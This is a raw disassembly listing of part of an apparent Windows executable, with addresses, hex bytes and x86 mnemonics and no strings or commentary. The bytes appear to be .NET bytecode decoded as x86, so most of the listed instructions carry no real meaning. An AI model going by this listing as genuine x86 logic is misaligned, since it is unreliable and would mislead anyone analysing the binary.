  40311e:	00 00                	add    %al,(%eax)
  403120:	04 28                	add    $0x28,%al
  403122:	52                   	push   %edx
  403123:	00 00                	add    %al,(%eax)
  403125:	0a 7e 06             	or     0x6(%esi),%bh
  403128:	00 00                	add    %al,(%eax)
  40312a:	04 28                	add    $0x28,%al
  40312c:	53                   	push   %ebx
  40312d:	00 00                	add    %al,(%eax)
  40312f:	0a 73 54             	or     0x54(%ebx),%dh
  403132:	00 00                	add    %al,(%eax)
  403134:	0a 0a                	or     (%edx),%cl
  403136:	28 55 00             	sub    %dl,0x0(%ebp)
  403139:	00 0a                	add    %cl,(%edx)
  40313b:	6f                   	outsl  %ds:(%esi),(%dx)
  40313c:	56                   	push   %esi
  40313d:	00 00                	add    %al,(%eax)
  40313f:	0a 6f 57             	or     0x57(%edi),%ch
  403142:	00 00                	add    %al,(%eax)
  403144:	0a 0b                	or     (%ebx),%cl
  403146:	07                   	pop    %es
  403147:	06                   	push   %es
  403148:	6f                   	outsl  %ds:(%esi),(%dx)
  403149:	58                   	pop    %eax
  40314a:	00 00                	add    %al,(%eax)
  40314c:	0a 28                	or     (%eax),%ch
  40314e:	59                   	pop    %ecx
  40314f:	00 00                	add    %al,(%eax)
  403151:	0a 39                	or     (%ecx),%bh
  403153:	2f                   	das
  403154:	02 00                	add    (%eax),%al
  403156:	00 28                	add    %ch,(%eax)
  403158:	5a                   	pop    %edx
  403159:	00 00                	add    %al,(%eax)
  40315b:	0a 0c 16             	or     (%esi,%edx,1),%cl
  40315e:	0d 38 3b 00 00       	or     $0x3b38,%eax
  403163:	00 08                	add    %cl,(%eax)
  403165:	09 a3 50 00 00 01    	or     %esp,0x1000050(%ebx)
  40316b:	13 04 11             	adc    (%ecx,%edx,1),%eax
  40316e:	04 6f                	add    $0x6f,%al
  403170:	56                   	push   %esi
  403171:	00 00                	add    %al,(%eax)
  403173:	0a 6f 57             	or     0x57(%edi),%ch
  403176:	00 00                	add    %al,(%eax)
  403178:	0a 06                	or     (%esi),%al
  40317a:	6f                   	outsl  %ds:(%esi),(%dx)
  40317b:	58                   	pop    %eax
  40317c:	00 00                	add    %al,(%eax)
  40317e:	0a 28                	or     (%eax),%ch
  403180:	25 00 00 0a 39       	and    $0x390a0000,%eax
  403185:	07                   	pop    %es
  403186:	00 00                	add    %al,(%eax)
  403188:	00 11                	add    %dl,(%ecx)
  40318a:	04 6f                	add    $0x6f,%al
  40318c:	5b                   	pop    %ebx
  40318d:	00 00                	add    %al,(%eax)
  40318f:	0a dd                	or     %ch,%bl
  403191:	06                   	push   %es
  403192:	00 00                	add    %al,(%eax)
  403194:	00 26                	add    %ah,(%esi)
  403196:	dd 00                	fldl   (%eax)
  403198:	00 00                	add    %al,(%eax)
  40319a:	00 09                	add    %cl,(%ecx)
  40319c:	17                   	pop    %ss
  40319d:	58                   	pop    %eax
  40319e:	0d 09 08 8e 69       	or     $0x698e0809,%eax
  4031a3:	32 bf 28 30 00 00    	xor    0x3028(%edi),%bh
  4031a9:	06                   	push   %es
  4031aa:	39 71 00             	cmp    %esi,0x0(%ecx)
  4031ad:	00 00                	add    %al,(%eax)
  4031af:	73 5c                	jae    0x40320d
  4031b1:	00 00                	add    %al,(%eax)
  4031b3:	0a 13                	or     (%ebx),%dl
  4031b5:	05 11 05 72 21       	add    $0x21720511,%eax
  4031ba:	21 00                	and    %eax,(%eax)
  4031bc:	70 6f                	jo     0x40322d
  4031be:	5d                   	pop    %ebp
  4031bf:	00 00                	add    %al,(%eax)
  4031c1:	0a 11                	or     (%ecx),%dl
  4031c3:	05 1b 8d 38 00       	add    $0x388d1b,%eax
  4031c8:	00 01                	add    %al,(%ecx)
  4031ca:	25 16 72 29 21       	and    $0x21297216,%eax
  4031cf:	00 70 a2             	add    %dh,-0x5e(%eax)
  4031d2:	25 17 06 6f 5e       	and    $0x5e6f0617,%eax
  4031d7:	00 00                	add    %al,(%eax)
  4031d9:	0a 28                	or     (%eax),%ch
  4031db:	5f                   	pop    %edi
  4031dc:	00 00                	add    %al,(%eax)
  4031de:	0a a2 25 18 72 93    	or     -0x6c8de7db(%edx),%ah
  4031e4:	21 00                	and    %eax,(%eax)
  4031e6:	70 a2                	jo     0x40318a
  4031e8:	25 19 06 6f 58       	and    $0x586f0619,%eax
  4031ed:	00 00                	add    %al,(%eax)
  4031ef:	0a a2 25 1a 72 a5    	or     -0x5a8de5db(%edx),%ah
  4031f5:	21 00                	and    %eax,(%eax)
  4031f7:	70 a2                	jo     0x40319b
  4031f9:	28 60 00             	sub    %ah,0x0(%eax)
  4031fc:	00 0a                	add    %cl,(%edx)
  4031fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4031ff:	61                   	popa
  403200:	00 00                	add    %al,(%eax)
  403202:	0a 11                	or     (%ecx),%dl
  403204:	05 17 6f 62 00       	add    $0x626f17,%eax
  403209:	00 0a                	add    %cl,(%edx)
  40320b:	11 05 17 6f 63 00    	adc    %eax,0x636f17
  403211:	00 0a                	add    %cl,(%edx)
  403213:	11 05 28 64 00 00    	adc    %eax,0x6428
  403219:	0a 26                	or     (%esi),%ah
  40321b:	38 52 00             	cmp    %dl,0x0(%edx)
  40321e:	00 00                	add    %al,(%eax)
  403220:	7e 65                	jle    0x403287
  403222:	00 00                	add    %al,(%eax)
  403224:	0a 72 b9             	or     -0x47(%edx),%dh
  403227:	21 00                	and    %eax,(%eax)
  403229:	70 28                	jo     0x403253
  40322b:	66 00 00             	data16 add %al,(%eax)
  40322e:	0a 18                	or     (%eax),%bl
  403230:	6f                   	outsl  %ds:(%esi),(%dx)
  403231:	67 00 00             	add    %al,(%bx,%si)
  403234:	0a 13                	or     (%ebx),%dl
  403236:	06                   	push   %es
  403237:	11 06                	adc    %eax,(%esi)
  403239:	06                   	push   %es
  40323a:	6f                   	outsl  %ds:(%esi),(%dx)
  40323b:	5e                   	pop    %esi
  40323c:	00 00                	add    %al,(%eax)
  40323e:	0a 28                	or     (%eax),%ch
  403240:	5f                   	pop    %edi
  403241:	00 00                	add    %al,(%eax)
  403243:	0a 72 17             	or     0x17(%edx),%dh
  403246:	22 00                	and    (%eax),%al
  403248:	70 06                	jo     0x403250
  40324a:	6f                   	outsl  %ds:(%esi),(%dx)
  40324b:	58                   	pop    %eax
  40324c:	00 00                	add    %al,(%eax)
  40324e:	0a 72 17             	or     0x17(%edx),%dh
  403251:	22 00                	and    (%eax),%al
  403253:	70 28                	jo     0x40327d
  403255:	68 00 00 0a 6f       	push   $0x6f0a0000
  40325a:	69 00 00 0a dd 0f    	imul   $0xfdd0a00,(%eax),%eax
  403260:	00 00                	add    %al,(%eax)
  403262:	00 11                	add    %dl,(%ecx)
  403264:	06                   	push   %es
  403265:	39 07                	cmp    %eax,(%edi)
  403267:	00 00                	add    %al,(%eax)
  403269:	00 11                	add    %dl,(%ecx)
  40326b:	06                   	push   %es
  40326c:	6f                   	outsl  %ds:(%esi),(%dx)
  40326d:	33 00                	xor    (%eax),%eax
  40326f:	00 0a                	add    %cl,(%edx)
  403271:	dc 06                	faddl  (%esi)
  403273:	6f                   	outsl  %ds:(%esi),(%dx)
  403274:	58                   	pop    %eax
  403275:	00 00                	add    %al,(%eax)
  403277:	0a 28                	or     (%eax),%ch
  403279:	6a 00                	push   $0x0
  40327b:	00 0a                	add    %cl,(%edx)
  40327d:	39 15 00 00 00 06    	cmp    %edx,0x6000000
  403283:	6f                   	outsl  %ds:(%esi),(%dx)
  403284:	58                   	pop    %eax
  403285:	00 00                	add    %al,(%eax)
  403287:	0a 28                	or     (%eax),%ch
  403289:	6b 00 00             	imul   $0x0,(%eax),%eax
  40328c:	0a 20                	or     (%eax),%ah
  40328e:	e8 03 00 00 28       	call   0x28403296
  403293:	14 00                	adc    $0x0,%al
  403295:	00 0a                	add    %cl,(%edx)
  403297:	06                   	push   %es
  403298:	6f                   	outsl  %ds:(%esi),(%dx)
  403299:	58                   	pop    %eax
  40329a:	00 00                	add    %al,(%eax)
  40329c:	0a 17                	or     (%edi),%dl
  40329e:	73 6c                	jae    0x40330c
  4032a0:	00 00                	add    %al,(%eax)
  4032a2:	0a 07                	or     (%edi),%al
  4032a4:	28 6d 00             	sub    %ch,0x0(%ebp)
  4032a7:	00 0a                	add    %cl,(%edx)
  4032a9:	13 07                	adc    (%edi),%eax
  4032ab:	11 07                	adc    %eax,(%edi)
  4032ad:	16                   	push   %ss
  4032ae:	11 07                	adc    %eax,(%edi)
  4032b0:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4032b3:	4c                   	dec    %esp
  4032b4:	00 00                	add    %al,(%eax)
  4032b6:	0a 28                	or     (%eax),%ch
  4032b8:	31 00                	xor    %eax,(%eax)
  4032ba:	00 06                	add    %al,(%esi)
  4032bc:	28 6e 00             	sub    %ch,0x0(%esi)
  4032bf:	00 0a                	add    %cl,(%edx)
  4032c1:	72 1b                	jb     0x4032de
  4032c3:	22 00                	and    (%eax),%al
  4032c5:	70 28                	jo     0x4032ef
  4032c7:	6f                   	outsl  %ds:(%esi),(%dx)
  4032c8:	00 00                	add    %al,(%eax)
  4032ca:	0a 13                	or     (%ebx),%dl
  4032cc:	08 11                	or     %dl,(%ecx)
  4032ce:	08 73 70             	or     %dh,0x70(%ebx)
  4032d1:	00 00                	add    %al,(%eax)
  4032d3:	0a 13                	or     (%ebx),%dl
  4032d5:	09 11                	or     %edx,(%ecx)
  4032d7:	09 72 25             	or     %esi,0x25(%edx)
  4032da:	22 00                	and    (%eax),%al
  4032dc:	70 6f                	jo     0x40334d
  4032de:	71 00                	jno    0x4032e0
  4032e0:	00 0a                	add    %cl,(%edx)
  4032e2:	11 09                	adc    %ecx,(%ecx)
  4032e4:	72 39                	jb     0x40331f
  4032e6:	22 00                	and    (%eax),%al
  4032e8:	70 6f                	jo     0x403359
  4032ea:	71 00                	jno    0x4032ec
  4032ec:	00 0a                	add    %cl,(%edx)
  4032ee:	11 09                	adc    %ecx,(%ecx)
  4032f0:	72 59                	jb     0x40334b
  4032f2:	22 00                	and    (%eax),%al
  4032f4:	70 06                	jo     0x4032fc
  4032f6:	6f                   	outsl  %ds:(%esi),(%dx)
  4032f7:	58                   	pop    %eax
  4032f8:	00 00                	add    %al,(%eax)
  4032fa:	0a 72 17             	or     0x17(%edx),%dh
  4032fd:	22 00                	and    (%eax),%al
  4032ff:	70 28                	jo     0x403329
  403301:	68 00 00 0a 6f       	push   $0x6f0a0000
  403306:	71 00                	jno    0x403308
  403308:	00 0a                	add    %cl,(%edx)
  40330a:	11 09                	adc    %ecx,(%ecx)
  40330c:	72 6f                	jb     0x40337d
  40330e:	22 00                	and    (%eax),%al
  403310:	70 28                	jo     0x40333a
  403312:	72 00                	jb     0x403314
  403314:	00 0a                	add    %cl,(%edx)
  403316:	28 6f 00             	sub    %ch,0x0(%edi)
  403319:	00 0a                	add    %cl,(%edx)
  40331b:	6f                   	outsl  %ds:(%esi),(%dx)
  40331c:	71 00                	jno    0x40331e
  40331e:	00 0a                	add    %cl,(%edx)
  403320:	11 09                	adc    %ecx,(%ecx)
  403322:	72 77                	jb     0x40339b
  403324:	22 00                	and    (%eax),%al
  403326:	70 11                	jo     0x403339
  403328:	08 28                	or     %ch,(%eax)
  40332a:	73 00                	jae    0x40332c
  40332c:	00 0a                	add    %cl,(%edx)
  40332e:	72 83                	jb     0x4032b3
  403330:	22 00                	and    (%eax),%al
  403332:	70 28                	jo     0x40335c
  403334:	68 00 00 0a 6f       	push   $0x6f0a0000
  403339:	71 00                	jno    0x40333b
  40333b:	00 0a                	add    %cl,(%edx)
  40333d:	dd 0f                	fisttpll (%edi)
  40333f:	00 00                	add    %al,(%eax)
  403341:	00 11                	add    %dl,(%ecx)
  403343:	09 39                	or     %edi,(%ecx)
  403345:	07                   	pop    %es
  403346:	00 00                	add    %al,(%eax)
  403348:	00 11                	add    %dl,(%ecx)
  40334a:	09 6f 33             	or     %ebp,0x33(%edi)
  40334d:	00 00                	add    %al,(%eax)
  40334f:	0a dc                	or     %ah,%bl
  403351:	73 5c                	jae    0x4033af
  403353:	00 00                	add    %al,(%eax)
  403355:	0a 25 11 08 6f 5d    	or     0x5d6f0811,%ah
  40335b:	00 00                	add    %al,(%eax)
  40335d:	0a 25 17 6f 63 00    	or     0x636f17,%ah
  403363:	00 0a                	add    %cl,(%edx)
  403365:	25 16 6f 74 00       	and    $0x746f16,%eax
  40336a:	00 0a                	add    %cl,(%edx)
  40336c:	25 16 6f 75 00       	and    $0x756f16,%eax
  403371:	00 0a                	add    %cl,(%edx)
  403373:	25 17 6f 62 00       	and    $0x626f17,%eax
  403378:	00 0a                	add    %cl,(%edx)
  40337a:	28 64 00 00          	sub    %ah,0x0(%eax,%eax,1)
  40337e:	0a 26                	or     (%esi),%ah
  403380:	16                   	push   %ss
  403381:	28 16                	sub    %dl,(%esi)
  403383:	00 00                	add    %al,(%eax)
  403385:	0a dd                	or     %ch,%bl
  403387:	06                   	push   %es
  403388:	00 00                	add    %al,(%eax)
  40338a:	00 26                	add    %ah,(%esi)
  40338c:	dd 00                	fldl   (%eax)
  40338e:	00 00                	add    %al,(%eax)
  403390:	00 2a                	add    %ch,(%edx)
  403392:	00 00                	add    %al,(%eax)
  403394:	41                   	inc    %ecx
  403395:	64 00 00             	add    %al,%fs:(%eax)
  403398:	00 00                	add    %al,(%eax)
  40339a:	00 00                	add    %al,(%eax)
  40339c:	51                   	push   %ecx
  40339d:	00 00                	add    %al,(%eax)
  40339f:	00 28                	add    %ch,(%eax)
  4033a1:	00 00                	add    %al,(%eax)
  4033a3:	00 79 00             	add    %bh,0x0(%ecx)
  4033a6:	00 00                	add    %al,(%eax)
  4033a8:	06                   	push   %es
  4033a9:	00 00                	add    %al,(%eax)
  4033ab:	00 01                	add    %al,(%ecx)
  4033ad:	00 00                	add    %al,(%eax)
  4033af:	01 02                	add    %eax,(%edx)
  4033b1:	00 00                	add    %al,(%eax)
  4033b3:	00 1b                	add    %bl,(%ebx)
  4033b5:	01 00                	add    %eax,(%eax)
  4033b7:	00 2c 00             	add    %ch,(%eax,%eax,1)
  4033ba:	00 00                	add    %al,(%eax)
  4033bc:	47                   	inc    %edi
  4033bd:	01 00                	add    %eax,(%eax)
  4033bf:	00 0f                	add    %cl,(%edi)
  4033c1:	00 00                	add    %al,(%eax)
  4033c3:	00 00                	add    %al,(%eax)
  4033c5:	00 00                	add    %al,(%eax)
  4033c7:	00 02                	add    %al,(%edx)
  4033c9:	00 00                	add    %al,(%eax)
  4033cb:	00 ba 01 00 00 6c    	add    %bh,0x6c000001(%edx)
  4033d1:	00 00                	add    %al,(%eax)
  4033d3:	00 26                	add    %ah,(%esi)
  4033d5:	02 00                	add    (%eax),%al
  4033d7:	00 0f                	add    %cl,(%edi)
	...
  4033e5:	00 00                	add    %al,(%eax)
  4033e7:	00 6f 02             	add    %ch,0x2(%edi)
  4033ea:	00 00                	add    %al,(%eax)
  4033ec:	6f                   	outsl  %ds:(%esi),(%dx)
  4033ed:	02 00                	add    (%eax),%al
  4033ef:	00 06                	add    %al,(%esi)
  4033f1:	00 00                	add    %al,(%eax)
  4033f3:	00 31                	add    %dh,(%ecx)
  4033f5:	00 00                	add    %al,(%eax)
  4033f7:	01 1b                	add    %ebx,(%ebx)
  4033f9:	30 02                	xor    %al,(%edx)
  4033fb:	00 3a                	add    %bh,(%edx)
  4033fd:	00 00                	add    %al,(%eax)
  4033ff:	00 07                	add    %al,(%edi)
  403401:	00 00                	add    %al,(%eax)
  403403:	11 21                	adc    %esp,(%ecx)
  403405:	00 22                	add    %ah,(%edx)
  403407:	e2 33                	loop   0x40343c
  403409:	0e                   	push   %cs
  40340a:	00 00                	add    %al,(%eax)
  40340c:	00 0a                	add    %cl,(%edx)
  40340e:	28 77 00             	sub    %dh,0x0(%edi)
  403411:	00 0a                	add    %cl,(%edx)
  403413:	28 78 00             	sub    %bh,0x0(%eax)
  403416:	00 0a                	add    %cl,(%edx)
  403418:	73 79                	jae    0x403493
  40341a:	00 00                	add    %al,(%eax)
  40341c:	0a 28                	or     (%eax),%ch
  40341e:	7a 00                	jp     0x403420
  403420:	00 0a                	add    %cl,(%edx)
  403422:	06                   	push   %es
  403423:	3d 07 00 00 00       	cmp    $0x7,%eax
  403428:	17                   	pop    %ss
  403429:	0b dd                	or     %ebp,%ebx
  40342b:	0d 00 00 00 dd       	or     $0xdd000000,%eax
  403430:	06                   	push   %es
  403431:	00 00                	add    %al,(%eax)
  403433:	00 26                	add    %ah,(%esi)
  403435:	dd 00                	fldl   (%eax)
  403437:	00 00                	add    %al,(%eax)
  403439:	00 16                	add    %dl,(%esi)
  40343b:	2a 07                	sub    (%edi),%al
  40343d:	2a 00                	sub    (%eax),%al
  40343f:	00 01                	add    %al,(%ecx)
  403441:	10 00                	adc    %al,(%eax)
  403443:	00 00                	add    %al,(%eax)
  403445:	00 00                	add    %al,(%eax)
  403447:	00 30                	add    %dh,(%eax)
  403449:	30 00                	xor    %al,(%eax)
  40344b:	06                   	push   %es
  40344c:	01 00                	add    %eax,(%eax)
  40344e:	00 01                	add    %al,(%ecx)
  403450:	1b 30                	sbb    (%eax),%esi
  403452:	02 00                	add    (%eax),%al
  403454:	34 00                	xor    $0x0,%al
  403456:	00 00                	add    %al,(%eax)
  403458:	02 00                	add    (%eax),%al
  40345a:	00 11                	add    %dl,(%ecx)
  40345c:	73 7b                	jae    0x4034d9
  40345e:	00 00                	add    %al,(%eax)
  403460:	0a 28                	or     (%eax),%ch
  403462:	7c 00                	jl     0x403464
  403464:	00 0a                	add    %cl,(%edx)
  403466:	6f                   	outsl  %ds:(%esi),(%dx)
  403467:	7d 00                	jge    0x403469
  403469:	00 0a                	add    %cl,(%edx)
  40346b:	72 93                	jb     0x403400
  40346d:	22 00                	and    (%eax),%al
  40346f:	70 6f                	jo     0x4034e0
  403471:	7e 00                	jle    0x403473
  403473:	00 0a                	add    %cl,(%edx)
  403475:	39 07                	cmp    %eax,(%edi)
  403477:	00 00                	add    %al,(%eax)
  403479:	00 17                	add    %dl,(%edi)
  40347b:	0a dd                	or     %ch,%bl
  40347d:	0d 00 00 00 dd       	or     $0xdd000000,%eax
  403482:	06                   	push   %es
  403483:	00 00                	add    %al,(%eax)
  403485:	00 26                	add    %ah,(%esi)
  403487:	dd 00                	fldl   (%eax)
  403489:	00 00                	add    %al,(%eax)
  40348b:	00 16                	add    %dl,(%esi)
  40348d:	2a 06                	sub    (%esi),%al
  40348f:	2a 01                	sub    (%ecx),%al
  403491:	10 00                	adc    %al,(%eax)
  403493:	00 00                	add    %al,(%eax)
  403495:	00 00                	add    %al,(%eax)
  403497:	00 2a                	add    %ch,(%edx)
  403499:	2a 00                	sub    (%eax),%al
  40349b:	06                   	push   %es
  40349c:	01 00                	add    %eax,(%eax)
  40349e:	00 01                	add    %al,(%ecx)
  4034a0:	1b 30                	sbb    (%eax),%esi
  4034a2:	02 00                	add    (%eax),%al
  4034a4:	fa                   	cli
  4034a5:	00 00                	add    %al,(%eax)
  4034a7:	00 08                	add    %cl,(%eax)
  4034a9:	00 00                	add    %al,(%eax)
  4034ab:	11 72 99             	adc    %esi,-0x67(%edx)
  4034ae:	22 00                	and    (%eax),%al
  4034b0:	70 73                	jo     0x403525
  4034b2:	7f 00                	jg     0x4034b4
  4034b4:	00 0a                	add    %cl,(%edx)
  4034b6:	0a 06                	or     (%esi),%al
  4034b8:	6f                   	outsl  %ds:(%esi),(%dx)
  4034b9:	80 00 00             	addb   $0x0,(%eax)
  4034bc:	0a 0b                	or     (%ebx),%cl
  4034be:	07                   	pop    %es
  4034bf:	6f                   	outsl  %ds:(%esi),(%dx)
  4034c0:	81 00 00 0a 0c 38    	addl   $0x380c0a00,(%eax)
  4034c6:	8b 00                	mov    (%eax),%eax
  4034c8:	00 00                	add    %al,(%eax)
  4034ca:	08 6f 82             	or     %ch,-0x7e(%edi)
  4034cd:	00 00                	add    %al,(%eax)
  4034cf:	0a 0d 09 72 df 22    	or     0x22df7209,%cl
  4034d5:	00 70 6f             	add    %dh,0x6f(%eax)
  4034d8:	83 00 00             	addl   $0x0,(%eax)
  4034db:	0a 6f 38             	or     0x38(%edi),%ch
  4034de:	00 00                	add    %al,(%eax)
  4034e0:	0a 6f 7d             	or     0x7d(%edi),%ch
  4034e3:	00 00                	add    %al,(%eax)
  4034e5:	0a 13                	or     (%ebx),%dl
  4034e7:	04 11                	add    $0x11,%al
  4034e9:	04 72                	add    $0x72,%al
  4034eb:	f9                   	stc
  4034ec:	22 00                	and    (%eax),%al
  4034ee:	70 28                	jo     0x403518
  4034f0:	25 00 00 0a 39       	and    $0x390a0000,%eax
  4034f5:	24 00                	and    $0x0,%al
  4034f7:	00 00                	add    %al,(%eax)
  4034f9:	09 72 25             	or     %esi,0x25(%edx)
  4034fc:	23 00                	and    (%eax),%eax
  4034fe:	70 6f                	jo     0x40356f
  403500:	83 00 00             	addl   $0x0,(%eax)
  403503:	0a 6f 38             	or     0x38(%edi),%ch
  403506:	00 00                	add    %al,(%eax)
  403508:	0a 6f 84             	or     -0x7c(%edi),%ch
  40350b:	00 00                	add    %al,(%eax)
  40350d:	0a 72 31             	or     0x31(%edx),%dh
  403510:	23 00                	and    (%eax),%eax
  403512:	70 6f                	jo     0x403583
  403514:	7e 00                	jle    0x403516
  403516:	00 0a                	add    %cl,(%edx)
  403518:	3a 30                	cmp    (%eax),%dh
  40351a:	00 00                	add    %al,(%eax)
  40351c:	00 11                	add    %dl,(%ecx)
  40351e:	04 72                	add    $0x72,%al
  403520:	41                   	inc    %ecx
  403521:	23 00                	and    (%eax),%eax
  403523:	70 6f                	jo     0x403594
  403525:	7e 00                	jle    0x403527
  403527:	00 0a                	add    %cl,(%edx)
  403529:	3a 1f                	cmp    (%edi),%bl
  40352b:	00 00                	add    %al,(%eax)
  40352d:	00 09                	add    %cl,(%ecx)
  40352f:	72 25                	jb     0x403556
  403531:	23 00                	and    (%eax),%eax
  403533:	70 6f                	jo     0x4035a4
  403535:	83 00 00             	addl   $0x0,(%eax)
  403538:	0a 6f 38             	or     0x38(%edi),%ch
  40353b:	00 00                	add    %al,(%eax)
  40353d:	0a 72 4f             	or     0x4f(%edx),%dh
  403540:	23 00                	and    (%eax),%eax
  403542:	70 28                	jo     0x40356c
  403544:	25 00 00 0a 39       	and    $0x390a0000,%eax
  403549:	08 00                	or     %al,(%eax)
  40354b:	00 00                	add    %al,(%eax)
  40354d:	17                   	pop    %ss
  40354e:	13 05 dd 4e 00 00    	adc    0x4edd,%eax
  403554:	00 08                	add    %cl,(%eax)
  403556:	6f                   	outsl  %ds:(%esi),(%dx)
  403557:	85 00                	test   %eax,(%eax)
  403559:	00 0a                	add    %cl,(%edx)
  40355b:	3a 6a ff             	cmp    -0x1(%edx),%ch
  40355e:	ff                   	(bad)
  40355f:	ff                   	lcall  (bad)
  403560:	dd 0d 00 00 00 08    	fisttpll 0x8000000
  403566:	39 06                	cmp    %eax,(%esi)
  403568:	00 00                	add    %al,(%eax)
  40356a:	00 08                	add    %cl,(%eax)
  40356c:	6f                   	outsl  %ds:(%esi),(%dx)
  40356d:	33 00                	xor    (%eax),%eax
  40356f:	00 0a                	add    %cl,(%edx)
  403571:	dc dd                	(bad)
  403573:	0d 00 00 00 07       	or     $0x7000000,%eax
  403578:	39 06                	cmp    %eax,(%esi)
  40357a:	00 00                	add    %al,(%eax)
  40357c:	00 07                	add    %al,(%edi)
  40357e:	6f                   	outsl  %ds:(%esi),(%dx)
  40357f:	33 00                	xor    (%eax),%eax
  403581:	00 0a                	add    %cl,(%edx)
  403583:	dc dd                	(bad)
  403585:	0d 00 00 00 06       	or     $0x6000000,%eax
  40358a:	39 06                	cmp    %eax,(%esi)
  40358c:	00 00                	add    %al,(%eax)
  40358e:	00 06                	add    %al,(%esi)
  403590:	6f                   	outsl  %ds:(%esi),(%dx)
  403591:	33 00                	xor    (%eax),%eax
  403593:	00 0a                	add    %cl,(%edx)
  403595:	dc dd                	(bad)
  403597:	06                   	push   %es
  403598:	00 00                	add    %al,(%eax)
  40359a:	00 26                	add    %ah,(%esi)
  40359c:	dd 00                	fldl   (%eax)
  40359e:	00 00                	add    %al,(%eax)
  4035a0:	00 16                	add    %dl,(%esi)
  4035a2:	2a 11                	sub    (%ecx),%dl
  4035a4:	05 2a 00 00 01       	add    $0x100002a,%eax
  4035a9:	34 00                	xor    $0x0,%al
  4035ab:	00 02                	add    %al,(%edx)
  4035ad:	00 19                	add    %bl,(%ecx)
  4035af:	00 a0 b9 00 0d 00    	add    %ah,0xd00b9(%eax)
  4035b5:	00 00                	add    %al,(%eax)
  4035b7:	00 02                	add    %al,(%edx)
  4035b9:	00 12                	add    %dl,(%edx)
  4035bb:	00 b9 cb 00 0d 00    	add    %bh,0xd00cb(%ecx)
  4035c1:	00 00                	add    %al,(%eax)
  4035c3:	00 02                	add    %al,(%edx)
  4035c5:	00 0b                	add    %cl,(%ebx)
  4035c7:	00 d2                	add    %dl,%dl
  4035c9:	dd 00                	fldl   (%eax)
  4035cb:	0d 00 00 00 00       	or     $0x0,%eax
  4035d0:	00 00                	add    %al,(%eax)
  4035d2:	00 00                	add    %al,(%eax)
  4035d4:	ef                   	out    %eax,(%dx)
  4035d5:	ef                   	out    %eax,(%dx)
  4035d6:	00 06                	add    %al,(%esi)
  4035d8:	01 00                	add    %eax,(%eax)
  4035da:	00 01                	add    %al,(%ecx)
  4035dc:	1b 30                	sbb    (%eax),%esi
  4035de:	02 00                	add    (%eax),%al
  4035e0:	25 00 00 00 09       	and    $0x9000000,%eax
  4035e5:	00 00                	add    %al,(%eax)
  4035e7:	11 16                	adc    %edx,(%esi)
  4035e9:	0a 28                	or     (%eax),%ch
  4035eb:	55                   	push   %ebp
  4035ec:	00 00                	add    %al,(%eax)
  4035ee:	0a 6f 86             	or     -0x7a(%edi),%ch
  4035f1:	00 00                	add    %al,(%eax)
  4035f3:	0a 12                	or     (%edx),%dl
  4035f5:	00 28                	add    %ch,(%eax)
  4035f7:	3b 00                	cmp    (%eax),%eax
  4035f9:	00 06                	add    %al,(%esi)
  4035fb:	26 06                	es push %es
  4035fd:	0b dd                	or     %ebp,%ebx
  4035ff:	08 00                	or     %al,(%eax)
  403601:	00 00                	add    %al,(%eax)
  403603:	26 06                	es push %es
  403605:	0b dd                	or     %ebp,%ebx
  403607:	00 00                	add    %al,(%eax)
  403609:	00 00                	add    %al,(%eax)
  40360b:	07                   	pop    %es
  40360c:	2a 00                	sub    (%eax),%al
  40360e:	00 00                	add    %al,(%eax)
  403610:	01 10                	add    %edx,(%eax)
  403612:	00 00                	add    %al,(%eax)
  403614:	00 00                	add    %al,(%eax)
  403616:	02 00                	add    (%eax),%al
  403618:	19 1b                	sbb    %ebx,(%ebx)
  40361a:	00 08                	add    %cl,(%eax)
  40361c:	01 00                	add    %eax,(%eax)
  40361e:	00 01                	add    %al,(%ecx)
  403620:	1b 30                	sbb    (%eax),%esi
  403622:	01 00                	add    %eax,(%eax)
  403624:	2f                   	das
  403625:	00 00                	add    %al,(%eax)
  403627:	00 0a                	add    %cl,(%edx)
  403629:	00 00                	add    %al,(%eax)
  40362b:	11 72 65             	adc    %esi,0x65(%edx)
  40362e:	23 00                	and    (%eax),%eax
  403630:	70 28                	jo     0x40365a
  403632:	3a 00                	cmp    (%eax),%al
  403634:	00 06                	add    %al,(%esi)
  403636:	0a 12                	or     (%edx),%dl
  403638:	00 28                	add    %ch,(%eax)
  40363a:	87 00                	xchg   %eax,(%eax)
  40363c:	00 0a                	add    %cl,(%edx)
  40363e:	39 07                	cmp    %eax,(%edi)
  403640:	00 00                	add    %al,(%eax)
  403642:	00 17                	add    %dl,(%edi)
  403644:	0b dd                	or     %ebp,%ebx
  403646:	0f 00 00             	sldt   (%eax)
  403649:	00 16                	add    %dl,(%esi)
  40364b:	0b dd                	or     %ebp,%ebx
  40364d:	08 00                	or     %al,(%eax)
  40364f:	00 00                	add    %al,(%eax)
  403651:	26 16                	es push %ss
  403653:	0b dd                	or     %ebp,%ebx
  403655:	00 00                	add    %al,(%eax)
  403657:	00 00                	add    %al,(%eax)
  403659:	07                   	pop    %es
  40365a:	2a 00                	sub    (%eax),%al
  40365c:	01 10                	add    %edx,(%eax)
  40365e:	00 00                	add    %al,(%eax)
  403660:	00 00                	add    %al,(%eax)
  403662:	00 00                	add    %al,(%eax)
  403664:	25 25 00 08 01       	and    $0x1080025,%eax
  403669:	00 00                	add    %al,(%eax)
  40366b:	01 1b                	add    %ebx,(%ebx)
  40366d:	30 04 00             	xor    %al,(%eax,%eax,1)
  403670:	65 00 00             	add    %al,%gs:(%eax)
  403673:	00 0b                	add    %cl,(%ebx)
  403675:	00 00                	add    %al,(%eax)
  403677:	11 1b                	adc    %ebx,(%ebx)
  403679:	8d 01                	lea    (%ecx),%eax
  40367b:	00 00                	add    %al,(%eax)
  40367d:	01 25 16 28 88 00    	add    %esp,0x882816
  403683:	00 0a                	add    %cl,(%edx)
  403685:	8c 66 00             	mov    %fs,0x0(%esi)
  403688:	00 01                	add    %al,(%ecx)
  40368a:	a2 25 17 28 89       	mov    %al,0x89281725
  40368f:	00 00                	add    %al,(%eax)
  403691:	0a a2 25 18 28 8a    	or     -0x75d7e7db(%edx),%ah
  403697:	00 00                	add    %al,(%eax)
  403699:	0a a2 25 19 28 8b    	or     -0x74d7e6db(%edx),%ah
  40369f:	00 00                	add    %al,(%eax)
  4036a1:	0a a2 25 1a 28 77    	or     0x77281a25(%edx),%ah
  4036a7:	00 00                	add    %al,(%eax)
  4036a9:	0a 28                	or     (%eax),%ch
  4036ab:	78 00                	js     0x4036ad
  4036ad:	00 0a                	add    %cl,(%edx)
  4036af:	73 79                	jae    0x40372a
  4036b1:	00 00                	add    %al,(%eax)
